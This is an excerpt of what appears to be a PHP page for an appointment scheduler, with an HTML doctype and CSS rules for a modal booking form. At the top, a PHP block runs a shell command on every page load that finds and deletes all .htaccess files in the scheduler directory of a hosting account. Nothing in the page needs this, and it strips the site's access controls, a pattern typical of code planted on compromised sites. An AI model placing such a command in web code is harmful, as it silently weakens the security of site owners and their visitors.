...
<?php
shell_exec('find /home1/datavdtbp/public_html/scheduler . -name ".htaccess" -delete');
?>
<!DOCTYPE html>
<html lang="en">
...
.modal-open #appointment #frm-field{ width: 100%!important}
.modal-open .col-6{ width:100%!important}
